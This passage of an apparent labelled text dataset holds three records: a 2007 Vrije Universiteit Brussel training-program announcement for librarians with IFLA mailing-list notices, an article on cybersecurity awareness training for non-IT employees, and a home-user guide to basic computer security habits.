development of an information service\n-- to communicate through the Internet with users of information, information providers, colleagues,…\n-- to apply quantitative methods in decision making related to information systems and services\n-- to retrieve information from the Internet\n-- to store information for later retrieval and access by potential users, using information technology\nContents of the program:\n3 months means about 10 weeks or about 50 days.\nDuring about 3 days per week for 10 weeks = 30 days, the participants will be guided by professors and other experts.\nDuring the other 2 days per week for 10 weeks = 20 days, they will work on tasks=assignments as\nindividuals or in groups, and their reports will be presented and discussed afterwards again\nguided by professors and other experts. The sessions are organised in such a way that\n--the first month = introduction level,\n--the second month = intermediate level, and\n--the third month = more advanced level.\nThanks to this approach and organisation, it may make sense to participate exceptionally during\nonly one or two of the three months, depending on expertise. However, the available scholarships\nare granted only to persons who will participate for the full three months.\nTo start with, the participants are offered an orientation tour of the University and the\nUniversity Library. Then some of the following subjects are covered. Of course, due to the\nlimited available time, not all the mentioned subjects can be discussed in each training\nprogram, but a SELECTION will be made by the organisers. The concrete content of each training\nprogram depends on the\navailability of suitable expert lecturers from\nduring the period of the training program. As soon as possible, the concrete schedule is made\navailable through the WWW site of the program.\n1. Management in libraries and information centers:\nStatistics to support decision making for information science and for library management.\nBusiness plans for libraries and information centers.\nUsing spreadsheets in the management of libraries and information centers.\nConsortia of libraries for the acquisition of electronic journals and databases.\nScientific writing methods.\nISBD = International Standard Bibliographic Description.\nFormats for computer-based cataloguing; MARC formats.\nNational libraries and national bibliographies.\nKnowledge organisation: subject classification schemes; thesaurus systems, ontologies.\nAssessing the influence of scientific journals; citations and impact factors.\nThe bibliometric laws.\nArchitecture of libraries and information centers.\nOrientation of information users; relations with information users.\nInterlibrary lending and co-operation; document delivery.\nDevelopment of a national or regional information network.\nThe information society.\nCultural aspects of the information society and information technology transfer.\nCopyright; information security; trans-border data flow.\nWriting a project proposal (for instance related to the establishment of an information network).\nConservation/preservation of printed documents.\nConservation/preservation of digital documents.\nInformetric aspects of the Internet.\nArtificial intelligence and knowledge representation in information science.\nElectronic journals: implementation in a library.\nIntegration of e-learning environments and library services.\nLibraries involvement in scientific publishing.\nInternational co-operation projects.\n2. Information and communication technology for libraries and information centers:\nMicrocomputer systems: evolution of hardware.\nDisks for computers.\nCD-ROM in a local area network.\nCD-R, CD-RW, DVD-R, DVD+R, DVD-RW, DVD+RW.\nMicrocomputer operating systems.\nMicrocomputer systems: applications software.\nText editing; word processing; desktop publishing.\nPresentation of data, using a microcomputer.\nCreating charts to present information.\nImage processing; graphics file formats; photo/image editing.\nMultimedia / Hypermedia.\nData communication; computer networks; Internet.\nWorld-Wide Web; hypertext and hypermedia.\nData-communications networks and librarians.\nSelecting and procuring a computer system;\nwriting a proposal for a computer implementation.\nProviding access to information through public Internet workstations.\nMethods for access to databases through Internet:\ntelnet, http/WWW, Z39.50 and ISO239.50, Open\nArchives Initiative - Metadata Harvesting Protocol.\n3. Information retrieval/searching:\nIntroductory concepts about information.\nInternet-based information resources: introduction.\nThe information industry and the information market.\nOnline information retrieval and database\nsearching; search tactics and strategies.\nInternet search engines.\nInformation available free of charge; open access.\nOnline access databases about books and about journal articles.\nElectronic newsletters and journals.\nComputer-network based interest groups.\nOnline systems versus CD-ROM.\nTheoretical and quantitative aspects of information retrieval.\nEvaluation of information retrieval strategies and systems.\nEvaluating the quality of information sources.\n4. Information architecture and digital libraries:\nBasic, fundamental, theoretical concepts.\nSoftware packages for local storage and retrieval of bibliographic information.\nIntroduction to the\nThe application of\nprinter; developing a\ndatabase structure; indexing data for fast retrieval;\nWindows; WINISIS; history\nand future of ISIS; programming in\nFormats: MARC; application\nof MARC in\nDownloading of information and record format conversion.\nOnline Public Access Catalogues (OPACs).\nArchives and records management.\nArchives in the domain of science and technology.\nGeographic Information Systems (GIS): an introduction.\nDeveloping a web site; HTML, CSS, XML, XSL; intranets; developing an intranet.\nEvaluating web sites.\nDynamic web pages.\nDeveloping co-operative community WWW sites; Web contents management systems.\nSetting up an electronic newsletter.\nExtensions of the classical WWW. (Client-based and server-based).\nIn addition to the courses taking place at the university campus, study visits are organised.\nA selection from the following possible visits is made:\n--to the Royal (National)\n--to the European Patent Office\n--to the Information Service\nof the Geology Department of the\n--to the inter-university postgraduate school on information and library science at the University of Antwerp, Belgium\n--to the library of the University of Antwerp, Belgium\n--to the human sciences\nlibrary of the\n--to the library of the\n--to the city library of\n--to the old central library\nand to the modern science and technology library of the KUL (university) in\n--to the VLIZ marine science\ninformation and documentation centre near the sea coast in Oostende /\n--to the central library of\n--to the Documentation\nDepartment of the KIT (the Royal Tropical Institute), and to the high school on\nlibraries, documentation and information, both in\n--to the headquarters of\nIFLA and to the National, Royal Library in Den Haag /\n--to the Institute for\nSocial Studies (ISS) in Den Haag /\nMore culturally oriented\nguided visits are also organised; these may include trips to the old cities of\nSoon after the start of the program, each participant presents to the other participants and to interested lecturers his/her interests, working environment, planning, tasks, experience. This is organised with printed posters in a small\nposter exhibition with time allotted for stimulating and ice-breaking discussions. At the end of the course, each participant completes a presentation supported by slides managed on computer, with constructive comments\non the training program experienced and with concrete recommendations to the organisers of this training program and to the director of their own organisation.\nAbout half of the time, the participants are guided by experts who are invited to the university. They use the other half time to solve problems, to make exercises, to use microcomputers and the Internet, to prepare discussions, for self study...\nBesides the formal, guided course activities, the participants have access like any regular student at our university\n--to several rooms equipped with microcomputers connected to the Internet,\n--to the university library which offers printed material, CD-ROMs and PCs with Internet access,\n--to the university restaurant and to sport facilities at low student prices.\nAt the end of the program all participants obtain a certificate stating that they have indeed participated, with a reference to the full detailed overview of the program contents on the WWW site of the program. Several substantial parts of the program are followed by an evaluation by the responsible expert of the knowledge and skills acquired by\neach participant; this can lead to a certificate of active and successful participation.\nNotebook pc for each participant:\nParticipants should of course bring a notebook or laptop computer, if they have one available.\nThis notebook pc should ideally include a wireless network card (WiFi) to connect to the Internet through the university wireless network. If however that is not possible, then the participant should communicate about this problem\nwith the secretariat of the training program, as soon as possible; then the program organisers can try to rent a personal notebook computer for the participant at a reasonable price.\nPoster session by participants:\nEach participant is expected to create a poster about ongoing activities related to information management in their home institution. This poster is presented in a poster session as early as possible early in the program. In this way,\nparticipants and some professors get to know each other efficiently and the participants learn to present information in the format of a scientific poster. Therefore, participants are encouraged to bring supporting materials like folders,\nleaflets, photos, maps, etc… for inclusion in their poster.\nScientific tutorial presentations by participants:\nEach participant is expected to present a tutorial presentation during the program of maximum 15 minutes, with 10 minutes of questions and answers plus discussion foreseen. The audience is composed of the other participants. The topic of each presentation is one aspect of their expertise. The aims are the following:\n- participants improve their scientific presentation, teaching and communication skills,\n- they share their knowledge with the other participants,\n- participants get to know each other better,\n- the session may form a basis for possible later co-operation, etc…\nTeachers, professors, experts, resource persons:\nThe following will be invited. They may contribute as they did in previous programs, if their agenda and the limited duration of the training program allow this:\n\" Collier, KUL,\n\" Dekeyser, KUL,\n\" De Keyser, Hogeschool, and\n\" De Smet,\n\" Koninckx, Vrije Universiteit Brussel, Brussel, Belgium\n\" Holans, KUL,\n\" Nieuwenhuysen, Vrije Universiteit Brussel, Brussel, Belgium\n\" Nyssen, Vrije Universiteit Brussel, Brussel, Belgium\n\" Rousseau, Universiteit Antwerpen,\n\" Van Audenhove, Vrije Universiteit Brussel, Brussel, Belgium\n\" Vanderpijpen, Royal/National Library,\nSocial and cultural activities planned:\n- Poster presentation by each participant to the other participants and to invited guests, about information management in their home institute, on the same evening as the welcome reception with drinks and appetizers, early in the program.\n- Evening with the opportunity to learn more about beer tasting and to taste some of the world-famous Belgian beers and some Belgian food.\n- Photography contests.\n- Farewell gathering with drinks and snacks. (final evening of the program)\nFurthermore the participants\ncan join some of the many activities at the university and in\nParticipation, registration=tuition fee and costs:\nParticipation is free of charge (!) for 12 participants from developing countries. They are selected by the Steering Committee of the program, by VLIR (the Flemish Inter-university Council) section for University Co-operation\nVLIR-UOS, and by DGOS. They\nalso receive a return flight ticket plus a scholarship to cover the costs of\ntransport from the airport upon arrival to their room, accommodation, health\ninsurance during the stay in\nand finally transport from their room to the airport. The detailed forms that are needed to request a grant=scholarship should be available through the Internet from the WWW site of VLIR-UOS. Their site is http://www.vliruos.be/\nAt the time of writing this text, the required forms, one for the request and one for the recommendation letters could be downloaded primarily from http://www.vliruos.be/index.php?navid=380&direct_to=Scholarships_Programme\nand from http://www.vliruos.be/index.php?navid=322&direct_to=Downloads\nGrant applications must be\nreceived by VLIR before the end of January! (and NOT before the end of February\nas in previous years up to 2005). Official\nand formal requests for a grant-scholarship or any other correspondence about\nthe grants should be sent to VLIR-UOS in\nThe ideal participant applying for a grant is younger than 40 years, and will be able to apply what has been learned directly in a professional scientific or technical environment afterwards.\nBesides the persons who receive a grant from the Belgian Government through VLIR, 8 persons can participate after paying a registration=tuition fee that is small in comparison with similar programs. The costs mentioned do NOT include air travel,\n-To participate during the full period: 2400 Euro\n-Exceptionally, persons who cannot participate for the whole period can nevertheless participate during 2 months only (1800 Euro) or during 1 month only (1000 Euro). It makes sense to attend for instance the first month or the first two months only. It makes less sense to participate only during the second or the third month, as introductions to some activities or topics may be missed.\n-To participate to particular items selected from the program: 30 Euro per half day.\nTo register and pay the registration=tuition fee, send the form (see below) by classical mail or by private courier, together with an international bank transfer / bank cheque / bank draft, payable to University Library, Vrije Universiteit Brussel, Pleinlaan 2, B-1050 BRUSSEL, Belgium, with no need for any bank account numbers.\nIf however this simple\nprocedure is NOT suitable for you, then you can transfer the required sum of\nmoney to the following bank account of the Vrije Universiteit Brussel: Fortis Bank located at Warandeberg 3 in\naccount number 001-0686459-66 or IBAN = BE07 0010 6864 5966 and do not forget (!) to mention as a remark:\nfor internal account VOPA21 BIBLINK3 University Library STIMULATE International Training Program. The money received by the Vrije Universiteit Brussel financial department must be transferred internally; this transfer takes about 1 week,\nwhich means a delay in the registration procedure, which is better avoided.\n(Without your remark, the money may be not retraceable and lost.)\nRealize that some bank transfer costs are involved and that these should be paid besides the requested participation fee that is transferred.\nThere is no formal deadline. However, we recommend you to register as early as possible, because \"first come, first served\": the arrival of your participation fee determines who can participate. Furthermore the later a participant\nis registered, the more difficult it becomes to find cheap and suitable accommodation.\nThere is NO need to \"apply\" prior to the registration, to request permission to participate or to be accepted, from the\norganizers of the program or from their universities. Also there is no age limit. The decision if the program is suitable and appropriate for an interested person is to be made by that person and not by the organizers. This is similar as participation to a conference. Invitation letters can be sent on request if needed, but in principle only when the\nparticipation = registration fee has been received. This announcement is in fact an invitation.\nIt is a waste of time to ask the organisers of the program about sponsors besides VLIR mentioned above.\nParticipants are covered during their stay by a full medical insurance. This costs about 40 Euro per month.\nThis is formalised as soon\nas possible after arrival in\nThe organisers of this program normally book in advance a single, cheap, basic room with access to a shared kitchen, as accommodation for each participant, unless a participant writes us that he/she wants to take care of accommodation\npersonally, for instance by\nstaying with a friend or by renting a room that offers more luxury. Participants pay for their accommodation\ndirectly to the person or organisation providing accommodation in\nThe cost of living in\nAccording to previous participants and in agreement with the grants provided by VLIR-UOS, 1100 Euro per month should be enough to cover all expenses, including accommodation, transport, food…\nHow to contact the organizers?\nE-mail (Internet): stimulate at vub.ac.be (or in\ncase that this does not seem to work, to Paul.Nieuwenhuysen at vub.ac.be)\n(change at in @ when you want to use an address)\nFax 32 2 629 2693 (or 2282)\nTel. 32 2 629 2629 or 32 2 629 2429 or 32 2 629 2609\nTelex 61051 vubco-b\nSTIMULATE-ITP (or Paul NIEUWENHUYSEN), University\nLibrary, Vrije Universiteit Brussel,\nPleinlaan 2, B-1050 Brussels, BELGIUM\nThe training is mainly organized at the University Library of the Vrije Universiteit Brussel.\nThe campus is located south\nof the older centre of the city of\nhttp://wikitravel.org/en/Brussels http://www.agenda.be/ about events going on in\nhttp://www.disgruntled.ca/writings/brussels/ offers information on\nbased on the experience of living there for some time http://www.eric-maerschalck.be/Brussels/bruxelles.php?log=NO\noffers photos made in\nhttp://www.ilotsacre.be/site/en/default_en.htm offers an interactive map and photos of\nhttp://www.sievers.nl/visitbrussels/ shows some photos made in\nInteresting trips are possible to places in neighbouring countries like The Netherlands and France. Therefore, participants should try to obtain also a visa for those countries (a so called Schengen-visa).\nProgram and Steering Committee:\nThe course director is Dr. Paul Nieuwenhuysen,\nprofessor at the Vrije Universiteit Brussel and\nguest professor at Universiteit Antwerpen,\nScience and technology librarian of the Vrije\nUniversiteit Brussel. http://www.vub.ac.be/BIBLIO/nieuwenhuysen/professional/\nAn official, formal Steering Committee is\ncomposed of members from the\nco-operating universities in\n- Vrije Universiteit Brussel,\n- Universiteit Antwerpen\n- Katholieke Universiteit Leuven\nThis Steering Committee supervises the\norganisation, the program and the budget. This\ncommittee reports formally to VLIR.\nThis version is dated 2007-11-06\nto STIMULATE, University Library, Vrije Universiteit Brussel,\nPleinlaan 2, B-1050 BRUSSEL,\nI want to participate. Therefore I send this as a\nletter AND I pay the registration=tuition fee as\ndescribed in the announcement of the\nInternational Training Program on INFORMATION.\n(So the following is NOT the form to apply for a grant.\nUse this form only when you pay the registration=tuition fee.)\na. Family name (surname): ...............................\n(married female participants please fill in\nmaiden-name as well as name of husband)\nb. First or given names (according to your official passport): ..............\nPersonal address: ...................................\nElectronic mail address\nTelephone, fax, telex:\nDate of birth: Place of birth:\nNationality: Sex: male / female\na. Name and address of employer: .................\nb. Since: ../../..\nc. Position - function - specialization\nd. Telephone, fax, telex and/or e-mail of the employer:\nEducation - studies:\nName of institute Degree Date\nKnowledge of English: writing: ........ speaking: ........ reading: .......\nHave you been abroad earlier? Please specify:\nDuties that you will carry out after returning to your country:\nPlease book a room for me OR\nDo NOT book a room for me; I will take care myself of accommodation\nDate and signature:.....................\nPlease include a recent photograph, as this will simplify identifying you upon arrival.\nTAPE publishes audio tape digitisation workflow\nAnne Muller [email@example.com]; on behalf of; Ecpa e-mail [firstname.lastname@example.org] Iflaemail@example.com Fri 7/03/2008\nTAPE has published web-based\nguidelines for digitisation. They describe the digitisation workflow for\nanalogue open reel tapes as a step by step approach for the production of\ndigital copies from analogue tapes from a technical point of view. Most of the\nworkflow may also be applied to audio cassettes. The workflow was written by\nJuha Henriksson (Finnish Jazz & Pop Archive) & Nadja Wallaszkovits\nThe workflow is mainly aimed at newcomers in the world of audio tape digitization. It contains references to other literature and many detailed photographs.\nYou will find the workflow at http://www.jazzpoparkisto.net/audio/\nThe TAPE project, Training\nfor Audiovisual Preservation in\nEuropean Commission on Preservation and Access (ECPA) c/o Royal Netherlands Academy of Arts and Sciences P.O. Box 19121, NL-1000 GC Amsterdam, The Netherlands Visiting address: Trippenhuis, Kloveniersburgwal 29, NL-1011 JV Amsterdam\nT ++31 - 20 - 551 08 39\nF ++31 - 20 - 620 49 41\nUNESCO grants USD 5,000 for information for development success stories\nSjoerd Koopman [Sjoerd.Koopman@IFLA.nl] IFLA-L Mon 3/03/2008\nWin US$5,000 funding for your project through IFAP Success Stories platform <http://www.unesco-ci.org/newsletter/lt/t_go.php?i=1193&e=MzUxNjE=&l=-http--www.unesco-ci.org/cgi-bin/ifapstories/page.cgi--Q-g--E-;d--E-1>\nUNESCO's Information for All Programme (IFAP) encourages communities using information for development to submit their success stories to the online platform where others could learn from them and adapt them to their own local situations. For more information see http://www.unesco-ci.org/cgi-bin/ifapstories/page.cgi?g=;d=1\nWeb Search: Multidisciplinary Perspectives\nfirstname.lastname@example.org; on behalf of; Amanda Spink [email@example.com] firstname.lastname@example.org Mon 25/02/2008\nWe're pleased to announce the publication of Web Search: Multidisciplinary Perspectives in the Information Science and Knowledge Management series by Springer. Contents include contributions approaching Web search engines from philosophical, cultural, critical, legal, economic, historical, political, and information scientific perspectives. The table of contents is pasted below. More information can be found at these links: Springer: <http://www.springer.com/computer/database+management+%26+information+retrieval/book/978-3-540-75828-0\nOur thanks to all the contributors!\nWeb Search: Multidisciplinary Perspectives Part I: Introduction\no Introduction (Amanda Spink and Michael Zimmer)\nPart II: Social, Cultural, and Philosophical Perspectives\no Through the Google Goggles: Sociopolitical Bias in Search\nEngine Design (Alejandro Diaz)\no Reconsidering the Rhizome: A Textual Analysis of Web Search\nEngines as Gatekeepers of the Internet (Aaron Hess)\no Exploring Gendered Notions: Gender, Job Hunting and Web\no Searching Ethics: The Role of Search Engines in the\nDistribution of Knowledge (\no The Gaze of the Perfect Search Engine: Google as an\nInfrastructure of Dataveillance (Michael Zimmer)\nPart III: Political, Legal, and Economic Perspectives\no Search Engine Liability for Copyright Infringement (Brian\nFitzgerald, Damien O'Brien, and Anne Fitzgerald)\no Search Engine Bias and the Demise of Search Engine (Eric Goldman)\no The Democratizing Effects of Search Engine Use: On Chance\nExposures and Organizational Hubs (Azi Lev-On)\no ‘Googling' Terrorists: Are Northern Irish Terrorists Visible on\nInternet Search Engines? (Paul Reilly)\no The History of the Internet Search Engine: Navigational Media\nand the Traffic (Elizabeth Van Couvering)\nPart IV: Information Behavior Perspectives\no Toward a Web Search Information Behavior Model (Shirlee Ann\nKnight and Amanda Spink)\no Web Searching for Health: Theoretical Foundations and\nConnections to Health Related Outcomes (Mohan Dutta and Graham. Bodie)\no Search Engines and Expertise about Global Issues: Well-defined\nLandscape or Undomesticated Wilderness? (Jenny Fry, Shefali Virkar, and Ralph Schroeder)\no Conceptual Models for Search (David Hendry and Efthimis\no Web Searching: A Quality Measurement Perspective (Dirk\nLewandowski and Nadine Höchstötter)\nPart V: Conclusion\no Conclusions and Further Research (Amanda Spink and Michael\nMichael Zimmer, PhD\nWORLD BOOK CAPITAL NOMINATION 2010\nSophie Felfoldi [Sophie.Felfoldi@IFLA.nl] email@example.com Fri 23/11/2007\nCALL FOR APPLICATIONS FOR THE WORLD BOOK CAPITAL NOMINATION 2010\nAPPEL A CANDIDATURES POUR LA NOMINATION DE LA CAPITALE MONDIALE DU LIVRE 2010\nPRESENTACIÓN DE CANDIDATURAS PARA LA DESIGNACIÓN DE LA CAPITAL MUNDIAL DEL LIBRO 2010: CONVOCATORIA\nThe Selection Committee for the World Book Capital is calling for nominations for the World Book Capital 2010. The complete applications, duly substantiated, including a cover or support letter from the mayor of the candidate-city and drafted in one of UNESCO's official languages (French, English, Spanish, Russian, Arabic or Chinese), should reach UNESCO no later than Monday 31 March 2008. No application received after this date will be taken into consideration.\nThe candidate programmes shall be aimed at promoting books and fostering reading during the period between one World Book and Copyright Day and the next (23 April).\nTo involve all regions of\nthe world in turn, the Selection Committee will avoid the consecutive\nnomination of cities from the same region. Since the 2009 title was awarded to\na city of the Arab States' region (\nThe applicants' programme proposals will be examined in the light of the following five criteria:\n1. the submission of an activity programme\nspecifically conceived for the\n2. the degree of municipal, regional, national and international involvement and the impact of the programmes.\n3. the quantity and quality of one-time or ongoing activities organized by the applicant city in collaboration with national and international professional organizations representing writers, publishers, booksellers and librarians and in full respect of the various players in the book supply chain.\n4. the quantity and quality of any other noteworthy projects promoting and fostering books and reading.\n5. the conformity with the principles of freedom of expression, freedom to publish and to distribute information, as stated in the UNESCO Constitution as well as by Articles 19 and 27 of the Universal Declaration of Human Rights and by the Agreement on the Importation of Educational, Scientific and Cultural Materials (Florence Agreement).\nBy presenting its application each candidate city commits itself, in case of nomination, to:\n1. Associate UNESCO, as well as the three professional associations represented in the Selection Committee, in its communication and information campaign, at all levels;\n2. Provide UNESCO, which will share it with all members of the Selection Committee, with a final report on the activities implemented during the nomination year. Besides, the City authorities will facilitate possible evaluation audits implemented on UNESCO's demand.\nThe Selection Committee –\noperating under the auspices of UNESCO – is made up of one representative of\nthe International Publishers Association (IPA), one representative of the\nInternational Booksellers' Federation (IBF), one representative of the International\nFederation of Library Associations and Institutions (IFLA) and one UNESCO\nrepresentative, under the chairmanship of the President of IPA. The Committee's\ntask is to choose a World Book Capital each year, in accordance with 31\nC/Resolution 29, adopted by the UNESCO General Conference on 2 November 2001.\nThe first World Book Capital chosen prior to the adoption of 31 C/Resolution 29\nMr Mauro Rosi\nDivision of Arts and\n1, rue Miollis\nTel.: +33 1 45 68 46 33\nFax: +33 1 45 68 55 95\n According to its own\ncriteria based on operational needs, UNESCO distinguishes five regions: Africa,", "label": 1}
{"text": "By Gail Dutton\nIT departments can’t ensure data security. Despite firewalls and anti-virus and anti-malware applications, cybersecurity experts say most computer systems already are infected, and there’s little IT administrators can do to prevent it. That’s the biggest surprise non-IT employees experience during computer security training.\n“Non-IT employees think cybersecurity isn’t their problem...and that IT has taken care of it,” notes Prenston Gale, director of information security for Dynamics Resource\nCorporation, which trains government agencies in cybersecurity. At one time, reliance upon the IT department was sufficient. Today, however, organizations’ security perimeter is human, and humans are the weakest link.\nLone hackers have been replaced by sophisticated criminal organizations and by hacktivists (such as Anonymous) that engage in automated, advanced persistent threats (APTs) that often gain entry by exploiting end-users. All organizations are vulnerable. Attackers target small companies, as well as multinationals, and general employees, as well as senior executives.\nSocial engineering and spear phishing are core tactics, according to the report, “When Advanced Persistent Threats Go Mainstream,” by the Security for Business Innovation Council (SBIC) and RSA. Unlike earlier scams, the e-mails or phone calls associated with social engineering appear legitimate. The Better Business Bureau (BBB) scam is an example. Companies receive an e-mail or phone call—purportedly from the BBB—alerting them about a customer complaint, along with the attached complaint form, or a case number and log-in information to a site link. Once the link is clicked, malware that steals information and destroys files is loaded onto the PC. “Social engineering attacks are based upon interacting with people pretending to be with a particular organization and then stealing information,” Gale says. “E-mail is one of biggest threat vectors.”\nAnother attack uses thumb drives. After the Department of Homeland Security (DHS) seeded a parking lot with thumb drives in 2011, it reported that 60 percent of the devices were inserted into agency or company computers. When the thumb drives had the organization’s logo, the insertion rate jumped to 90 percent, according to network security firm Idappcom. The danger is that the drives could harbor malware or Trojans that make it easy for hackers to penetrate. When security firm Sophos analyzed 50 USB drives left on RailCorp trains in Australia, it found that 66 percent contained malware. None were encrypted.\nOne insidious botnet (a zombie army of infected computers) attack actually cleans up host device problems, so the PC runs beautifully, and then uses it to launch distributed denial-of-service (DDoS) attacks against other systems.\nActive training using simulated phishing and spear-phishing (targeted) attacks, and serious gaming using situations unique to employees’ jobs are the most effective approaches to cybersecurity training. The objective is for individuals to recognize they could be responsible for major information breaches. In contrast, traditional methods such as Webinars, videos, and classroom sessions haven’t made the threat real for participants, according to the SBIC report.\n“Being phished isn’t a matter of being dumb. Even the late Steve Jobs (founder of Apple) fell for a spear-phishing attack,” emphasizes Rohyt Belani, adjunct professor at Carnegie Mellon University and CEO and co-founder of PhishMe.\nAs Dave Frymier, corporate information systems officer (CISO) of Unisys, elaborates, “It’s easy to enter innocuous sites that lead to unexpected places. Employees can’t always back out, and sometimes the system is infected.” Detecting phishing depends upon noticing that something about a contact doesn’t seem right. With training, computer users become more aware of the dangers of active hyperlinks and opening attachments and links to sites that ask for sensitive information, even when the story is believable.\n“The best way to make training effective is to make it hands-on and interesting, and to immerse people in the experience,” Belani says. “For phishing, you don’t have to explain much.” He developed an automated way to conduct unannounced, mock phishing exercises that provide instant, targeted training to those who are susceptible to the attack.\nBy providing training at the point of their risky behavior, people gain instant perspective and spot subsequent dangers quicker and easier. These bite-sized experiences have enough emotional stress to get employees’ attention, and present one concept at a time, such as a flashcard, for easy learning.\nBefore beginning a program, PhishMe blasts a notice throughout the organization alerting employees that spot training will occur throughout the year in the course of their normal work. But when simulated attacks are sent, there’s no warning. PhishMe simulated attacks arrive just like any other e-mail. “On a first training run at an organization, we typically find 58 percent of the people would click a bad link in an e-mail,” Belani notes. “At 12 months, after running the campaign every two months, susceptibility is below 10 percent. The key to success is the frequent nature of the training.”\nThe challenge for IT-which often is the unit tasked with conducting cybersecurity training-is a combination of miniscule funding, boring training methods, and failure to recognize that training non-IT staff in cybersecurity is crucial.\nUnisys has trained non-IT employees in cybersecurity since 2001. As Frymier says, “We focus on commonalities: what constitutes information security; why it’s important; what a breach would mean to our four main business units; and what it would mean to functions such as contracting, regulatory compliance, etc.” The jargon-free course changes at least 30 percent each year. “Last year, the course addressed encryption resources for e-mail, files, and whole disks. New content this year focuses upon phishing.”\n“The hidden face of the ‘Bring your own devices (BYOD)’ trend is the PC,” Frymier says. Although mobile device concerns are garnering headlines, many people access the corporate network remotely, from their home PCs in the evenings. Consequently, corporate data is stored there and on thumb drives.\n“Unisys solidified its security policies and guidelines with a major focus on secure BYOD,” Frymier says. The policy outlines acceptable uses of personal devices for Internet usage and corporate data in two pages of plain language, pointing out individuals’ responsibility if they put corporate data on a device the corporation doesn’t own, as well as the possible repercussions if the corporation is sued for any reason. “Employees must understand they may be required to surrender devices that hold corporate data during the legal discovery process. That happens less than 1 percent of the time, but it’s a risk,” Frymier says.\nBest practices are evolving, along with the threats. Randy Gross, CIO of the Computer Technology Industry Association (CompTIA), advises organizations to use up-to-date technology and to have secure tools available to employees. Then, ensure employees have internalized the risks, know how to behave on the Internet and in e-mail, and understand implications of the business’ regulations and the regulatory environment relating to data security. As a rule of thumb, Gross advises, “If you haven’t purchased it, don’t trust it.”\nCybersecurity Training Strategies\nBy Maya Yankelevich, Senior Human Capital Consultant, PDRI\nWho is part of the cyber workforce? All employees at every level of the organization share a responsibility to protect valuable information assets. Cybersecurity is part of every business function; it weaves throughout all aspects of daily business operations and, therefore, should be an intrinsic element of all training and development programs. A resilient organization is the result of an educated workforce and a technologically savvy infrastructure.\nFew organizations have a comprehensive cybersecurity workforce planning strategy in place. As key stakeholders collaborate to develop this strategy, they must address the ongoing critical shortage of cybersecurity professionals. Learning management experts then can plan and deploy training and development initiatives that are precisely aligned with the enterprise’s overarching cybersecurity strategy.\nConduct a Gap Analysis\nAfter setting strategic direction, determine the critical skills and competencies that are required to achieve strategic objectives. A gap analysis can assess current workforce capabilities and deficiencies. Keep in mind that those working on the front lines of cyber defense must possess a mix of hybrid skills-communications expertise and interpersonal capabilities that supplement technical ability, enabling engagement and effective collaboration with stakeholders in other disciplines and business leaders across the organization.\nWorking together, the chief information security officer’s team, the organization’s human capital experts, and the training organization can improve the effectiveness of workforce cybersecurity programs by spearheading initiatives that will develop the diverse and sophisticated capabilities required to combat increasingly complex cyber threats. CISOs who collaborate with their chief human capital officer (CHCO) allies will ensure that they have the resources and infrastructure in place to build, develop, and sustain a resilient and globally competitive organization.\nDeploy Engaging Training Programs\nThe training organization is tasked with building and executing learning content that supports the enterprise cybersecurity strategy...teaching risk management skills to end-users and enhancing the capabilities of cyber professionals to improve business performance. Critical to consider is the knowledge and know-how needed by everyday users versus true cybersecurity professionals, and the different motivators that will lead to success for each group.\nTraditional end-user security awareness training programs often lack requisite accountability and vigilance. They frequently are flat and lack the necessary impact. Cybersecurity awareness is no longer optional; instead of investing scarce training dollars in standard in-house or costly offsite development programs that often don’t deliver measurable return on investment, savvy organizations offer flexible and immersive learning programs tailored to specific enterprise goals.\nTraining content must be rich and engaging for unique cyber talent populations; the in-demand experts are motivated by challenge and looking for the next growth opportunity. For example, channel a hacker-like propensity to break code into risk reduction expertise that secures the organization’s most valuable assets in the cyber domain. Realistic hands-on training and development simulations that replicate real-world environments will not only ensure that these cyber warriors keep their skills sharp but also enable them to grow within the organization rather than pursue opportunities elsewhere.\nMonitor Success of Initiatives\nAfter new programs are deployed, continuously evaluate the impact of training and development efforts by measuring employee awareness, behaviors, and capabilities. Are you achieving the objectives outlined in the enterprise cybersecurity strategy? Iteratively update learning tools to ensure the ongoing effectiveness of the organization’s response to a constantly evolving threat landscape.", "label": 1}
{"text": "There are some simple habits you can adopt that, if performed consistently, may dramatically reduce the chances that the information on your computer will be lost or corrupted.\nHow can you minimize the access other people have to your information?\nYou may be able to easily identify people who could, legitimately or not, gain physical access to your computer—family members, roommates, co-workers, members of a cleaning crew, and maybe others. Identifying the people who could gainremote access to your computer becomes much more difficult. As long as you have a computer and connect it to a network, you are vulnerable to someone or something else accessing or corrupting your information; however, you can develop habits that make it more difficult.\n- Lock your computer when you are away from it. Even if you only step away from your computer for a few minutes, it's enough time for someone else to destroy or corrupt your information. Locking your computer prevents another person from being able to simply sit down at your computer and access all of your information.\n- Disconnect your computer from the Internet when you aren't using it. The development of technologies such as DSL and cable modems have made it possible for users to be online all the time, but this convenience comes with risks. The likelihood that attackers or viruses scanning the network for available computers will target your computer becomes much higher if your computer is always connected. Depending on what method you use to connect to the Internet, disconnecting may mean disabling a wireless connection, turning off your computer or modem, or disconnecting cables. When you are connected, make sure that you have a firewall enabled (see Understanding Firewalls for more information).\n- Evaluate your security settings. Most software, including browsers and email programs, offers a variety of features that you can tailor to meet your needs and requirements. Enabling certain features to increase convenience or functionality may leave you more vulnerable to being attacked. It is important to examine the settings, particularly the security settings, and select options that meet your needs without putting you at increased risk. If you install a patch or a new version of the software, or if you hear of something that might affect your settings, reevaluate your settings to make sure they are still appropriate (see Understanding Patches, Safeguarding Your Data, and Evaluating Your Web Browser's Security Settings for more information).\nWhat other steps can you take?\nSometimes the threats to your information aren't from other people but from natural or technological causes. Although there is no way to control or prevent these problems, you can prepare for them and try to minimize the damage.\n- Protect your computer against power surges and brief outages. Aside from providing outlets to plug in your computer and all of its peripherals, some power strips protect your computer against power surges. Many power strips now advertise compensation if they do not effectively protect your computer. Power strips alone will not protect you from power outages, but there are products that do offer an uninterruptible power supply when there are power surges or outages. During a lightning storm or construction work that increases the odds of power surges, consider shutting your computer down and unplugging it from all power sources.\n- Back up all of your data. Whether or not you take steps to protect yourself, there will always be a possibility that something will happen to destroy your data. You have probably already experienced this at least once— losing one or more files due to an accident, a virus or worm, a natural event, or a problem with your equipment. Regularly backing up your data on a CD or network reduces the stress and other negative consequences that result from losing important information (see Real-World Warnings Keep You Safe Online for more information). Determining how often to back up your data is a personal decision. If you are constantly adding or changing data, you may find weekly backups to be the best alternative; if your content rarely changes, you may decide that your backups do not need to be as frequent. You don't need to back up software that you own on CD-ROM or DVD-ROM—you can reinstall the software from the original media if necessary.\nBoth the National Cyber Security Alliance and US-CERT have identified this topic as one of the top tips for home users.\nAuthors: Mindi McDowell, Allen Householder", "label": 1}
